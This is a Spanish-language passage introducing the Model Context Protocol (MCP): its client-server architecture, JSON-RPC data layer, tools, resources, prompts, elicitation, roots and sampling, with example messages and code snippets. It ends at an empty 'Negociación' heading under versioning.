# Introducción al Protocolo de Contexto de Modelo (MCP)

> Fuente: [modelcontextprotocol.io](https://modelcontextprotocol.io/docs/develop/build-server)

---

## ¿Qué es el Protocolo de Contexto de Modelo (MCP)?

MCP (Model Context Protocol) es un estándar de código abierto para conectar aplicaciones de IA a sistemas externos.

Usando MCP, aplicaciones de IA como Claude o ChatGPT pueden conectarse a fuentes de datos (por ejemplo, archivos locales, bases de datos), herramientas (por ejemplo, motores de búsqueda, calculadoras) y flujos de trabajo (por ejemplo, prompts especializados), lo que les permite acceder a información clave y realizar tareas.

Pensá en MCP como el puerto USB-C de las aplicaciones de IA. Así como USB-C proporciona una forma estandarizada de conectar dispositivos electrónicos, MCP proporciona una forma estandarizada de conectar aplicaciones de IA a sistemas externos.

---

## ¿Qué puede habilitar MCP?

- Los agentes pueden acceder a tu Google Calendar y Notion, actuando como un asistente de IA más personalizado.
- Claude Code puede generar una aplicación web completa a partir de un diseño en Figma.
- Los chatbots empresariales pueden conectarse a múltiples bases de datos de una organización, permitiendo a los usuarios analizar datos mediante chat.
- Los modelos de IA pueden crear diseños 3D en Blender e imprimirlos con una impresora 3D.

---

## ¿Por qué importa MCP?

Dependiendo de tu rol en el ecosistema, MCP puede ofrecer distintos beneficios:

| Actor | Beneficio |
|---|---|
| **Desarrolladores** | MCP reduce el tiempo de desarrollo y la complejidad al construir o integrarse con una aplicación de IA o agente |
| **Aplicaciones de IA / agentes** | MCP brinda acceso a un ecosistema de fuentes de datos, herramientas y apps que mejoran las capacidades y la experiencia del usuario final |
| **Usuarios finales** | MCP resulta en aplicaciones de IA más capaces que pueden acceder a tus datos y tomar acciones en tu nombre cuando sea necesario |

---

## Soporte amplio en el ecosistema

MCP es un protocolo abierto con soporte en una amplia variedad de clientes y servidores. Asistentes de IA como Claude y ChatGPT, herramientas de desarrollo como Visual Studio Code, Cursor, MCPJam y muchos otros soportan MCP, lo que facilita construir una sola vez e integrar en todos lados.

---

## Descripción general de la arquitectura

Esta sección cubre el alcance de MCP, sus conceptos centrales y un ejemplo que demuestra cada concepto.

Como los SDKs de MCP abstraen muchas complejidades, la mayoría de los desarrolladores encontrará que la sección del protocolo de la capa de datos es la más útil, ya que explica cómo los servidores MCP pueden proveer contexto a una aplicación de IA.

---

### Alcance

El Protocolo de Contexto de Modelo incluye los siguientes proyectos:

- **Especificación MCP**: Define los requisitos de implementación para clientes y servidores.
- **SDKs de MCP**: SDKs para distintos lenguajes de programación que implementan MCP.
- **Herramientas de desarrollo MCP**: Incluye el MCP Inspector para desarrollar y depurar servidores y clientes.
- **Implementaciones de referencia**: Servidores MCP de referencia oficiales.

> MCP se enfoca exclusivamente en el protocolo de intercambio de contexto; no dicta cómo las aplicaciones de IA usan los LLMs ni cómo gestionan el contexto recibido.

---

### Participantes

MCP sigue una arquitectura cliente-servidor donde un **MCP host** —una aplicación de IA como Claude Code o Claude Desktop— establece conexiones a uno o más servidores MCP. El host lo hace creando un cliente MCP por cada servidor. Cada cliente mantiene una conexión dedicada con su servidor correspondiente.

Los servidores MCP locales (transporte STDIO) típicamente sirven a un solo cliente, mientras que los servidores remotos (transporte Streamable HTTP) suelen servir a muchos clientes simultáneamente.

| Participante | Qué es |
|---|---|
| **MCP Host** | La aplicación de IA que coordina y gestiona uno o múltiples clientes MCP |
| **MCP Client** | Componente que mantiene la conexión con un servidor MCP y obtiene contexto para el host |
| **MCP Server** | Programa que provee contexto a los clientes MCP |

**Ejemplo concreto:** Visual Studio Code actúa como MCP host. Al conectarse al servidor Sentry MCP, VS Code instancia un objeto cliente que mantiene esa conexión. Al conectarse luego al servidor local de filesystem, instancia un segundo cliente para esa conexión.

```mermaid
graph TB
    subgraph "MCP Host (Aplicación de IA)"
        Client1["MCP Client 1"]
        Client2["MCP Client 2"]
        Client3["MCP Client 3"]
        Client4["MCP Client 4"]
    end

    ServerA["MCP Server A - Local (ej. Filesystem)"]
    ServerB["MCP Server B - Local (ej. Base de datos)"]
    ServerC["MCP Server C - Remoto (ej. Sentry)"]

    Client1 ---|"Conexión dedicada"| ServerA
    Client2 ---|"Conexión dedicada"| ServerB
    Client3 ---|"Conexión dedicada"| ServerC
    Client4 ---|"Conexión dedicada"| ServerC
```

> "Servidor local" y "servidor remoto" se refieren a dónde corre el servidor, no a su función. Un servidor local usa transporte STDIO y corre en la misma máquina; un servidor remoto usa Streamable HTTP y corre en otra plataforma.

---

### Capas

MCP se compone de dos capas:

| Capa | Qué define |
|---|---|
| **Capa de datos** (interna) | El protocolo basado en JSON-RPC para la comunicación cliente-servidor: lifecycle management, primitivos (tools, resources, prompts) y notificaciones |
| **Capa de transporte** (externa) | Los mecanismos de comunicación: establecimiento de conexión, framing de mensajes y autorización |

#### Capa de datos

Implementa un protocolo de intercambio basado en JSON-RPC 2.0 e incluye:

- **Gestión del ciclo de vida**: inicialización de la conexión, negociación de capacidades y terminación
- **Features del servidor**: tools para acciones de IA, resources para datos de contexto, prompts como templates de interacción
- **Features del cliente**: sampling desde el LLM del host, elicitation de input del usuario, logging de mensajes
- **Features de utilidad**: notificaciones para actualizaciones en tiempo real, seguimiento de progreso en operaciones largas

#### Capa de transporte

Gestiona los canales de comunicación y la autenticación. MCP soporta dos mecanismos:

| Transporte | Mecanismo | Uso típico |
|---|---|---|
| **Stdio** | Streams de stdin/stdout entre procesos locales | Servidores locales, sin overhead de red |
| **Streamable HTTP** | HTTP POST + Server-Sent Events opcionales | Servidores remotos, autenticación OAuth/Bearer/API key |

La capa de transporte abstrae los detalles de comunicación, permitiendo que el mismo formato de mensajes JSON-RPC 2.0 funcione sobre cualquier transporte.

---

### Protocolo de la capa de datos

#### Gestión del ciclo de vida

MCP es un protocolo con estado (stateful) que requiere gestión del ciclo de vida. Su propósito es negociar qué capacidades soportan ambas partes. Una parte del protocolo puede hacerse sin estado usando el transporte Streamable HTTP.

#### Primitivos

Los primitivos MCP son el concepto más importante del protocolo. Definen qué pueden ofrecerse mutuamente clientes y servidores.

**Primitivos que exponen los servidores:**

| Primitivo | Qué es | Ejemplos |
|---|---|---|
| **Tools** | Funciones ejecutables que las aplicaciones de IA pueden invocar para realizar acciones | Operaciones de archivos, llamadas a APIs, queries a bases de datos |
| **Resources** | Fuentes de datos que proveen información contextual | Contenido de archivos, registros de bases de datos, respuestas de APIs |
| **Prompts** | Templates reutilizables para estructurar interacciones con modelos de lenguaje | System prompts, ejemplos few-shot |

Cada tipo de primitivo tiene métodos asociados para descubrimiento (`*/list`), recuperación (`*/get`) y, en algunos casos, ejecución (`tools/call`). El diseño de listado dinámico permite que los servidores cambien sus primitivos disponibles en tiempo real.

**Primitivos que exponen los clientes:**

| Primitivo | Qué permite |
|---|---|
| **Sampling** | Los servidores solicitan completions del LLM al cliente, sin necesitar su propio SDK de IA |
| **Elicitation** | Los servidores solicitan información adicional al usuario |
| **Logging** | Los servidores envían mensajes de log al cliente para debug y monitoreo |

**Primitivos de utilidad transversales:**

| Primitivo | Qué es |
|---|---|
| **Tasks** *(experimental)* | Wrappers de ejecución durable para operaciones costosas, con recuperación diferida de resultados y seguimiento de estado |

#### Notificaciones

El protocolo soporta notificaciones en tiempo real para actualizaciones dinámicas entre servidores y clientes. Por ejemplo, cuando las tools disponibles de un servidor cambian, puede enviar una notificación `tools/list_changed` a los clientes conectados. Las notificaciones son mensajes JSON-RPC 2.0 que no esperan respuesta.

---

### Ejemplo: flujo completo de interacción

#### Paso 1 — Inicialización (gestión del ciclo de vida)

MCP comienza con un handshake de negociación de capacidades:

```json
// Request del cliente al servidor
{
  "jsonrpc": "2.0",
  "id": 1,
  "method": "initialize",
  "params": {
    "protocolVersion": "2025-06-18",
    "capabilities": { "elicitation": {} },
    "clientInfo": { "name": "example-client", "version": "1.0.0" }
  }
}

// Respuesta del servidor
{
  "jsonrpc": "2.0",
  "id": 1,
  "result": {
    "protocolVersion": "2025-06-18",
    "capabilities": {
      "tools": { "listChanged": true },
      "resources": {}
    },
    "serverInfo": { "name": "example-server", "version": "1.0.0" }
  }
}
```

El intercambio de inicialización cumple tres propósitos:

| Propósito | Campo | Detalle |
|---|---|---|
| Negociación de versión | `protocolVersion` | Si no hay versión compatible, la conexión debe terminarse |
| Descubrimiento de capacidades | `capabilities` | Cada parte declara qué primitivos y features soporta |
| Identificación | `clientInfo` / `serverInfo` | Para debug y compatibilidad |

Tras la inicialización, el cliente notifica que está listo:

```json
{ "jsonrpc": "2.0", "method": "notifications/initialized" }
```

```python
# Cómo lo usa una aplicación de IA
async with stdio_client(server_config) as (read, write):
    async with ClientSession(read, write) as session:
        init_response = await session.initialize()
        if init_response.capabilities.tools:
            app.register_mcp_server(session, supports_tools=True)
        app.set_server_ready(session)
```

---

#### Paso 2 — Descubrimiento de tools (primitivos)

Con la conexión establecida, el cliente descubre las tools disponibles:

```json
// Request
{ "jsonrpc": "2.0", "id": 2, "method": "tools/list" }

// Respuesta
{
  "jsonrpc": "2.0",
  "id": 2,
  "result": {
    "tools": [
      {
        "name": "calculator_arithmetic",
        "title": "Calculator",
        "description": "Realiza cálculos matemáticos incluyendo aritmética básica, funciones trigonométricas y operaciones algebraicas",
        "inputSchema": {
          "type": "object",
          "properties": {
            "expression": { "type": "string", "description": "Expresión matemática a evaluar" }
          },
          "required": ["expression"]
        }
      },
      {
        "name": "weather_current",
        "title": "Weather Information",
        "description": "Obtiene información meteorológica actual para cualquier ubicación",
        "inputSchema": {
          "type": "object",
          "properties": {
            "location": { "type": "string" },
            "units": { "type": "string", "enum": ["metric", "imperial", "kelvin"], "default": "metric" }
          },
          "required": ["location"]
        }
      }
    ]
  }
}
```

Campos clave de cada tool en la respuesta:

| Campo | Propósito |
|---|---|
| `name` | Identificador único; se usa exactamente igual en `tools/call` |
| `title` | Nombre legible para mostrar en la UI |
| `description` | El LLM lee esto para decidir cuándo usar la tool |
| `inputSchema` | JSON Schema para validación de parámetros |

```python
# Cómo la app registra todas las tools de todos los servidores
available_tools = []
for session in app.mcp_server_sessions():
    tools_response = await session.list_tools()
    available_tools.extend(tools_response.tools)
conversation.register_available_tools(available_tools)
```

---

#### Paso 3 — Ejecución de una tool (primitivos)

El cliente ejecuta una tool usando `tools/call`:

```json
// Request
{
  "jsonrpc": "2.0",
  "id": 3,
  "method": "tools/call",
  "params": {
    "name": "weather_current",
    "arguments": { "location": "San Francisco", "units": "imperial" }
  }
}

// Respuesta
{
  "jsonrpc": "2.0",
  "id": 3,
  "result": {
    "content": [
      { "type": "text", "text": "Clima actual en San Francisco: 68°F, parcialmente nublado con vientos del oeste a 8 mph. Humedad: 65%" }
    ]
  }
}
```

> La respuesta usa un array `content` — las tools pueden devolver múltiples bloques de contenido (texto, imágenes, recursos) en una sola respuesta.

```python
# Cómo la app maneja una tool call del LLM
async def handle_tool_call(conversation, tool_name, arguments):
    session = app.find_mcp_session_for_tool(tool_name)
    result = await session.call_tool(tool_name, arguments)
    conversation.add_tool_result(result.content)
```

---

#### Paso 4 — Actualizaciones en tiempo real (notificaciones)

Cuando las tools disponibles del servidor cambian, este notifica a los clientes sin que ellos lo soliciten:

```json
// Notificación del servidor (sin id → no espera respuesta)
{ "jsonrpc": "2.0", "method": "notifications/tools/list_changed" }

// El cliente reacciona solicitando la lista actualizada
{ "jsonrpc": "2.0", "id": 4, "method": "tools/list" }
```

Por qué importan las notificaciones:

| Ventaja | Detalle |
|---|---|
| **Entornos dinámicos** | Las tools pueden aparecer o desaparecer según el estado del servidor |
| **Eficiencia** | Los clientes no necesitan hacer polling; son notificados cuando hay cambios |
| **Consistencia** | Los clientes siempre tienen información actualizada sobre las capacidades del servidor |
| **Colaboración en tiempo real** | Las apps de IA se adaptan a nuevas funcionalidades al instante |

```python
# Cómo la app maneja la notificación de cambio
async def handle_tools_changed_notification(session):
    tools_response = await session.list_tools()
    app.update_available_tools(session, tools_response.tools)
    if app.conversation.is_active():
        app.conversation.notify_llm_of_new_capabilities()
```

---

## Entendiendo los servidores MCP

Los servidores MCP son programas que exponen capacidades específicas a las aplicaciones de IA a través de interfaces de protocolo estandarizadas.

Ejemplos comunes: servidores de filesystem para acceso a documentos, servidores de base de datos para consultas, servidores de GitHub para gestión de código, servidores de Slack para comunicación de equipo, servidores de calendario para scheduling.

---

### Características principales del servidor

Los servidores proveen funcionalidad a través de tres bloques:

| Característica | Explicación | Ejemplos | Quién lo controla |
|---|---|---|---|
| **Tools** | Funciones que el LLM puede invocar activamente; decide cuándo usarlas según los pedidos del usuario. Pueden escribir en bases de datos, llamar APIs, modificar archivos o disparar lógica externa. | Buscar vuelos, enviar mensajes, crear eventos | El modelo |
| **Resources** | Fuentes de datos pasivas de solo lectura que proveen contexto, como contenido de archivos, esquemas de bases de datos o documentación de APIs. | Recuperar documentos, acceder a bases de conocimiento, leer calendarios | La aplicación |
| **Prompts** | Templates de instrucciones prefabricadas que indican al modelo cómo trabajar con tools y resources específicas. | Planificar una vacación, resumir reuniones, redactar un email | El usuario |

---

### Tools

Las tools permiten que los modelos de IA realicen acciones. Cada tool define una operación específica con inputs y outputs tipados. El modelo solicita la ejecución de una tool basándose en el contexto.

#### Cómo funcionan las tools

Las tools son interfaces definidas por un schema que los LLMs pueden invocar. MCP usa JSON Schema para validación. Cada tool realiza una sola operación con inputs y outputs claramente definidos. Las tools pueden requerir el consentimiento del usuario antes de ejecutarse, lo que ayuda a garantizar que los usuarios mantengan el control sobre las acciones del modelo.

**Operaciones del protocolo:**

| Método | Propósito | Retorna |
|---|---|---|
| `tools/list` | Descubrir tools disponibles | Array de definiciones de tools con schemas |
| `tools/call` | Ejecutar una tool específica | Resultado de la ejecución |

**Ejemplo de definición de una tool:**

```typescript
{
  name: "searchFlights",
  description: "Buscar vuelos disponibles",
  inputSchema: {
    type: "object",
    properties: {
      origin:      { type: "string", description: "Ciudad de origen" },
      destination: { type: "string", description: "Ciudad de destino" },
      date:        { type: "string", format: "date", description: "Fecha de viaje" }
    },
    required: ["origin", "destination", "date"]
  }
}
```

#### Ejemplo: reserva de viaje

En un escenario de planificación de viajes, la aplicación de IA podría usar varias tools:

```
// Búsqueda de vuelos
searchFlights(origin: "NYC", destination: "Barcelona", date: "2024-06-15")

// Bloqueo en el calendario
createCalendarEvent(title: "Barcelona Trip", startDate: "2024-06-15", endDate: "2024-06-22")

// Notificación por email
sendEmail(to: "team@work.com", subject: "Out of Office", body: "...")
```

#### Modelo de interacción con el usuario

Las tools son controladas por el modelo, lo que significa que los modelos de IA pueden descubrirlas e invocarlas automáticamente. Sin embargo, MCP enfatiza la supervisión humana a través de varios mecanismos:

- Mostrar las tools disponibles en la UI para que el usuario decida cuáles habilitar
- Diálogos de aprobación para ejecuciones individuales
- Configuración de permisos para pre-aprobar operaciones seguras
- Registros de actividad que muestran todas las ejecuciones con sus resultados

---

### Resources

Las resources proveen acceso estructurado a información que la aplicación de IA puede recuperar y proveer a los modelos como contexto.

#### Cómo funcionan las resources

Las resources exponen datos de archivos, APIs, bases de datos o cualquier fuente que la IA necesite para entender el contexto. Las aplicaciones acceden a esta información directamente y deciden cómo usarla: seleccionando porciones relevantes, buscando con embeddings o pasándola completa al modelo.

Cada resource tiene una URI única (ej. `file:///path/to/document.md`) y declara su MIME type para el manejo apropiado del contenido.

Las resources soportan dos patrones de descubrimiento:

- **Resources directas**: URIs fijos que apuntan a datos específicos. Ej: `calendar://events/2024`
- **Resource templates**: URIs dinámicos con parámetros para consultas flexibles. Ej: `travel://activities/{city}/{category}`

Los templates incluyen metadatos como título, descripción y MIME type esperado, lo que los hace descubribles y autodocumentados.

**Operaciones del protocolo:**

| Método | Propósito | Retorna |
|---|---|---|
| `resources/list` | Listar resources directas disponibles | Array de descriptores de resources |
| `resources/templates/list` | Descubrir resource templates | Array de definiciones de templates |
| `resources/read` | Recuperar el contenido de una resource | Datos con metadatos |
| `resources/subscribe` | Monitorear cambios en una resource | Confirmación de suscripción |

#### Ejemplo: contexto para planificación de viajes

```
calendar://events/2024        → verifica disponibilidad del usuario
file:///Documents/passport.pdf → accede a documentos de viaje
trips://history/barcelona-2023 → referencia viajes anteriores y preferencias
```

**Ejemplos de resource templates:**

```json
{
  "uriTemplate": "weather://forecast/{city}/{date}",
  "name": "weather-forecast",
  "title": "Pronóstico del tiempo",
  "description": "Obtiene el pronóstico para cualquier ciudad y fecha",
  "mimeType": "application/json"
}
```

#### Completado de parámetros

Las resources dinámicas soportan completado de parámetros. Por ejemplo:

- Tipear "Par" para `weather://forecast/{city}` puede sugerir "París" o "Park City"
- Tipear "JFK" para `flights://search/{airport}` puede sugerir "JFK - John F. Kennedy International"

#### Modelo de interacción con el usuario

Las resources son controladas por la aplicación, que tiene flexibilidad para recuperarlas, procesarlas y presentarlas. Patrones comunes de UI:

- Vistas de árbol o lista para navegar resources como carpetas
- Interfaces de búsqueda y filtrado
- Inclusión automática de contexto o sugerencias inteligentes
- Selección manual o masiva de múltiples resources

---

### Prompts

Los prompts proveen templates reutilizables. Permiten que los autores de servidores MCP ofrezcan prompts parametrizados para un dominio, o muestren cómo usar mejor el servidor.

#### Cómo funcionan los prompts

Los prompts son templates estructurados que definen inputs esperados y patrones de interacción. Son controlados por el usuario, requiriendo invocación explícita en lugar de activación automática. Pueden ser conscientes del contexto, referenciando resources y tools disponibles para crear flujos de trabajo completos. Al igual que las resources, los prompts soportan completado de parámetros.

**Operaciones del protocolo:**

| Método | Propósito | Retorna |
|---|---|---|
| `prompts/list` | Descubrir prompts disponibles | Array de descriptores de prompts |
| `prompts/get` | Recuperar los detalles de un prompt | Definición completa con argumentos |

#### Ejemplo: flujos de trabajo estandarizados

```json
{
  "name": "plan-vacation",
  "title": "Planificá una vacación",
  "description": "Guía el proceso de planificación de vacaciones",
  "arguments": [
    { "name": "destination", "type": "string", "required": true },
    { "name": "duration",    "type": "number", "description": "días" },
    { "name": "budget",      "type": "number", "required": false },
    { "name": "interests",   "type": "array",  "items": { "type": "string" } }
  ]
}
```

En lugar de input en lenguaje natural no estructurado, el sistema de prompts permite:

1. Seleccionar el template "Planificá una vacación"
2. Input estructurado: Barcelona, 7 días, $3000, ["playas", "arquitectura", "gastronomía"]
3. Ejecución consistente del flujo de trabajo basada en el template

#### Modelo de interacción con el usuario

Los prompts se exponen típicamente a través de patrones de UI como:

- Slash commands (tipear "/" para ver `/plan-vacation`)
- Paletas de comandos con búsqueda
- Botones de UI dedicados para prompts frecuentes
- Menús contextuales que sugieren prompts relevantes

---

### Múltiples servidores trabajando juntos

El poder real de MCP emerge cuando múltiples servidores especializados colaboran a través de una interfaz unificada.

#### Ejemplo: planificador de viajes multi-servidor

Considerá una aplicación de planificación de viajes con tres servidores conectados:

- **Travel Server**: gestiona vuelos, hoteles e itinerarios
- **Weather Server**: provee datos climáticos y pronósticos
- **Calendar/Email Server**: gestiona agendas y comunicaciones

**Flujo completo:**

1. El usuario invoca el prompt con parámetros:

```json
{
  "prompt": "plan-vacation",
  "arguments": {
    "destination": "Barcelona",
    "departure_date": "2024-06-15",
    "return_date": "2024-06-22",
    "budget": 3000,
    "travelers": 2
  }
}
```

2. El usuario selecciona las resources a incluir:
   - `calendar://my-calendar/June-2024` (Calendar Server)
   - `travel://preferences/europe` (Travel Server)
   - `travel://past-trips/Spain-2023` (Travel Server)

3. La IA procesa el pedido usando tools:
   - Lee todas las resources seleccionadas para reunir contexto (fechas disponibles, aerolíneas preferidas, viajes anteriores)
   - Ejecuta `searchFlights()` y `checkWeather()`
   - Con aprobación del usuario: ejecuta `bookHotel()`, `createCalendarEvent()` y `sendEmail()`

**Resultado:** a través de múltiples servidores MCP, el usuario investigó y reservó un viaje a Barcelona adaptado a su agenda. El prompt "Planificá una vacación" guió a la IA para combinar Resources (disponibilidad del calendario e historial de viajes) con Tools (búsqueda de vuelos, reserva de hoteles, actualización del calendario) entre distintos servidores. Una tarea que podría haber llevado horas se completó en minutos.

---

## Entendiendo los clientes MCP

Los clientes MCP son instanciados por las aplicaciones host para comunicarse con servidores MCP particulares. La aplicación host, como Claude.ai o un IDE, gestiona la experiencia general del usuario y coordina múltiples clientes. Cada cliente maneja una única comunicación directa con un servidor.

La distinción es importante: el *host* es la aplicación con la que interactúan los usuarios, mientras que los *clientes* son los componentes a nivel de protocolo que habilitan las conexiones con los servidores.

---

### Características principales del cliente

Además de usar el contexto provisto por los servidores, los clientes pueden proveer varias características a los servidores. Estas características permiten que los autores de servidores construyan interacciones más ricas.

| Característica | Explicación | Ejemplo |
|---|---|---|
| **Elicitation** | Permite que los servidores soliciten información específica a los usuarios durante las interacciones, de forma estructurada y bajo demanda. | Un servidor de reservas puede pedir las preferencias de asiento, tipo de habitación o número de contacto para finalizar una reserva. |
| **Roots** | Permite que los clientes especifiquen qué directorios deben tener en foco los servidores, comunicando el alcance previsto como mecanismo de coordinación. | Un servidor de reservas puede recibir acceso a un directorio específico desde el cual leer el calendario del usuario. |
| **Sampling** | Permite que los servidores soliciten completions del LLM a través del cliente, habilitando flujos de trabajo agénticos. Este enfoque pone al cliente en control total de los permisos del usuario y las medidas de seguridad. | Un servidor puede enviar una lista de vuelos al LLM y solicitar que elija el mejor para el usuario. |

---

### Elicitation

Elicitation permite que los servidores soliciten información específica a los usuarios durante las interacciones, creando flujos de trabajo más dinámicos y responsivos.

#### Descripción general

Elicitation provee una forma estructurada para que los servidores recopilen información necesaria bajo demanda. En lugar de requerir toda la información por adelantado o fallar cuando faltan datos, los servidores pueden pausar sus operaciones para solicitar inputs específicos a los usuarios. Esto crea interacciones más flexibles donde los servidores se adaptan a las necesidades del usuario en lugar de seguir patrones rígidos.

**Flujo de elicitation:**

```mermaid
sequenceDiagram
    participant Usuario
    participant Cliente
    participant Servidor

    Note over Servidor,Cliente: El servidor inicia la elicitation
    Servidor->>Cliente: elicitation/create

    Note over Cliente,Usuario: Interacción humana
    Cliente->>Usuario: Presenta la UI de elicitation
    Usuario-->>Cliente: Provee la información solicitada

    Note over Servidor,Cliente: Completa el pedido
    Cliente-->>Servidor: Devuelve la respuesta del usuario

    Note over Servidor: Continúa procesando con la nueva información
```

**Ejemplo de componentes de elicitation:**

```typescript
{
  method: "elicitation/create",
  params: {
    message: "Por favor confirmá los detalles de tu reserva en Barcelona:",
    schema: {
      type: "object",
      properties: {
        confirmBooking: {
          type: "boolean",
          description: "Confirmar la reserva (Vuelos + Hotel = $3,000)"
        },
        seatPreference: {
          type: "string",
          enum: ["window", "aisle", "no preference"],
          description: "Tipo de asiento preferido para los vuelos"
        },
        roomType: {
          type: "string",
          enum: ["sea view", "city view", "garden view"],
          description: "Tipo de habitación preferida en el hotel"
        },
        travelInsurance: {
          type: "boolean",
          default: false,
          description: "Agregar seguro de viaje ($150)"
        }
      },
      required: ["confirmBooking"]
    }
  }
}
```

#### Ejemplo: aprobación de reserva de vacaciones

Un servidor de reservas de viajes demuestra el poder de elicitation en el proceso de confirmación final. Cuando el usuario seleccionó su paquete de vacaciones ideal a Barcelona, el servidor necesita reunir la aprobación final y cualquier detalle faltante antes de proceder.

El servidor solicita la confirmación de reserva con un pedido estructurado que incluye el resumen del viaje (vuelos a Barcelona del 15 al 22 de junio, hotel frente al mar, total $3,000) y campos para preferencias adicionales como selección de asiento, tipo de habitación u opciones de seguro.

#### Modelo de interacción con el usuario

Las interacciones de elicitation están diseñadas para ser claras, contextuales y respetuosas de la autonomía del usuario:

- **Presentación del pedido**: Los clientes muestran los pedidos de elicitation con contexto claro sobre qué servidor está solicitando la información, por qué se necesita y cómo se usará.
- **Opciones de respuesta**: Los usuarios pueden proveer la información solicitada, rechazarla con explicación opcional, o cancelar toda la operación. Los clientes validan las respuestas contra el schema antes de devolverlas.
- **Consideraciones de privacidad**: Elicitation nunca solicita contraseñas ni API keys. Los clientes advierten sobre pedidos sospechosos y permiten que los usuarios revisen los datos antes de enviarlos.

---

### Roots

Los roots definen los límites del filesystem para las operaciones del servidor, permitiendo que los clientes especifiquen en qué directorios deben enfocarse los servidores.

#### Descripción general

Los roots son un mecanismo para que los clientes comuniquen los límites de acceso al filesystem a los servidores. Consisten en URIs de archivos que indican los directorios donde los servidores pueden operar, ayudando a los servidores a entender el alcance de los archivos y carpetas disponibles.

> Los roots comunican los límites previstos pero **no imponen restricciones de seguridad**. La seguridad real debe aplicarse a nivel del sistema operativo mediante permisos de archivo y/o sandboxing.

**Estructura de un root:**

```json
{
  "uri": "file:///Users/agent/travel-planning",
  "name": "Travel Planning Workspace"
}
```

Los roots son exclusivamente rutas del filesystem y siempre usan el esquema `file://`. La lista de roots puede actualizarse dinámicamente cuando los usuarios trabajan con diferentes proyectos, y los servidores reciben notificaciones a través de `roots/list_changed` cuando los límites cambian.

#### Ejemplo: workspace de planificación de viajes

Un agente de viajes trabajando con múltiples clientes se beneficia de los roots para organizar el acceso al filesystem:

- `file:///Users/agent/travel-planning` — Workspace principal con todos los archivos de viaje
- `file:///Users/agent/travel-templates` — Templates de itinerarios reutilizables
- `file:///Users/agent/client-documents` — Pasaportes y documentos de clientes

Cuando el agente crea un itinerario para Barcelona, los servidores bien comportados respetan estos límites accediendo a templates, guardando el nuevo itinerario y referenciando documentos dentro de los roots especificados.

Si el agente abre una carpeta de archivo como `file:///Users/agent/archive/2023-trips`, el cliente actualiza la lista de roots via `roots/list_changed`.

#### Filosofía de diseño

Los roots sirven como mecanismo de coordinación entre clientes y servidores, no como límite de seguridad. La especificación requiere que los servidores "DEBERÍAN respetar los límites de roots", no que "DEBEN aplicarlos", porque los servidores ejecutan código que el cliente no puede controlar.

| Caso de uso | Los roots son efectivos |
|---|---|
| Servidores confiables o verificados | Sí |
| Prevención de accidentes | Sí |
| Organización del scope de trabajo | Sí |
| Detener comportamiento malicioso | No — para eso se necesitan permisos del OS |

---

### Sampling / muestreo

Sampling permite que los servidores soliciten completions del modelo de lenguaje a través del cliente, habilitando comportamientos agénticos mientras se mantiene la seguridad y el control del usuario.

#### Descripción general

Sampling permite que los servidores realicen tareas dependientes de IA sin integrar directamente ni pagar por modelos de IA. En cambio, los servidores pueden solicitar que el cliente —que ya tiene acceso al modelo de IA— maneje estas tareas en su nombre. Dado que los pedidos de sampling ocurren dentro del contexto de otras operaciones y se procesan como llamadas de modelo separadas, mantienen límites claros entre diferentes contextos y permiten un uso más eficiente de la ventana de contexto.

**Flujo de sampling:**

```mermaid
sequenceDiagram
    participant LLM
    participant Usuario
    participant Cliente
    participant Servidor

    Note over Servidor,Cliente: El servidor inicia el sampling
    Servidor->>Cliente: sampling/createMessage

    Note over Cliente,Usuario: Revisión human-in-the-loop
    Cliente->>Usuario: Presenta el pedido para aprobación
    Usuario-->>Cliente: Revisa y aprueba/modifica

    Note over Cliente,LLM: Interacción con el modelo
    Cliente->>LLM: Reenvía el pedido aprobado
    LLM-->>Cliente: Devuelve la generación

    Note over Cliente,Usuario: Revisión de la respuesta
    Cliente->>Usuario: Presenta la respuesta para aprobación
    Usuario-->>Cliente: Revisa y aprueba/modifica

    Note over Servidor,Cliente: Completa el pedido
    Cliente-->>Servidor: Devuelve la respuesta aprobada
```

El flujo garantiza seguridad a través de múltiples checkpoints human-in-the-loop. Los usuarios revisan y pueden modificar tanto el pedido inicial como la respuesta generada antes de que vuelva al servidor.

**Parámetros del pedido:**

```typescript
{
  messages: [
    {
      role: "user",
      content: "Analizá estas opciones de vuelo y recomendá la mejor:\n" +
               "[47 vuelos con precios, horarios, aerolíneas y escalas]\n" +
               "Preferencias del usuario: salida a la mañana, máximo 1 escala"
    }
  ],
  modelPreferences: {
    hints: [{ name: "claude-sonnet-4-20250514" }],
    costPriority: 0.3,         // menos preocupado por el costo de API
    speedPriority: 0.2,        // puede esperar por un análisis detallado
    intelligencePriority: 0.9  // necesita evaluar trade-offs complejos
  },
  systemPrompt: "Sos un experto en viajes ayudando a usuarios a encontrar los mejores vuelos",
  maxTokens: 1500
}
```

#### Ejemplo: tool de análisis de vuelos

Considerá un servidor de reservas con una tool llamada `findBestFlight` que usa sampling para analizar vuelos disponibles y recomendar la opción óptima. Cuando un usuario pide "Reservame el mejor vuelo a Barcelona el mes que viene", la tool necesita asistencia de IA para evaluar trade-offs complejos.

La tool consulta APIs de aerolíneas y reúne 47 opciones de vuelo. Luego solicita asistencia de IA para analizarlas, permitiendo al modelo evaluar trade-offs como vuelos nocturnos más baratos versus salidas convenientes a la mañana. La tool usa este análisis para presentar las tres mejores recomendaciones.

#### Modelo de interacción con el usuario

Sampling está diseñado para permitir control human-in-the-loop:

| Mecanismo | Detalle |
|---|---|
| **Controles de aprobación** | Los pedidos de sampling pueden requerir consentimiento explícito del usuario; pueden aprobarse, rechazarse o modificarse |
| **Transparencia** | Los clientes pueden mostrar el prompt exacto, la selección de modelo y los límites de tokens antes de que la respuesta vuelva al servidor |
| **Opciones de configuración** | Los usuarios pueden establecer preferencias de modelo, configurar auto-aprobación para operaciones confiables o requerir aprobación para todo |
| **Consideraciones de seguridad** | Los clientes deben implementar rate limiting y validar todo el contenido de los mensajes; el diseño human-in-the-loop garantiza que las interacciones de IA iniciadas por el servidor no comprometan la seguridad sin consentimiento explícito |

---

## Versionado

El Protocolo de Contexto de Modelo usa identificadores de versión en formato de cadena de texto con el esquema `AAAA-MM-DD`, que indica la última fecha en que se realizaron cambios incompatibles hacia atrás.

> La versión del protocolo **no** se incrementa cuando se actualiza con cambios que mantienen compatibilidad hacia atrás. Esto permite mejoras incrementales preservando la interoperabilidad.

### Revisiones

Las revisiones pueden estar marcadas como:

| Estado | Significado |
|---|---|
| **Draft** | Especificaciones en progreso, aún no listas para uso |
| **Current** | La versión actual del protocolo, lista para usar; puede seguir recibiendo cambios compatibles hacia atrás |
| **Final** | Especificaciones pasadas y completas que no serán modificadas |

La versión **actual** del protocolo es **2025-11-25**.

### Negociación

